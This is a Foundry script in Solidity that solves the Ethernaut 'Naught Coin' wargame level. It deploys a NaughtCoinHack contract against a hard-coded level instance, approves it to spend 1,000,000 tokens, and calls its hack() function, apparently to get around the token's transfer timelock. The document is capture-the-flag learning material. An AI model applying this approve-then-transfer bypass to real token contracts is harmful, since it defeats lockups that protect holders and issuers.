// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {NaughtCoinHack} from "ethernaut/naught_coin_hack.sol";
import "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract NaughtCoinHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        NaughtCoinHack naughtcoinhack = new NaughtCoinHack(0x385B3b97729e06a28F85A0044B3EB849DA948A14);
        IERC20(0x385B3b97729e06a28F85A0044B3EB849DA948A14).approve(address(naughtcoinhack), 1000000 * (10**18));
        naughtcoinhack.hack();
        vm.stopBroadcast();
    }
}
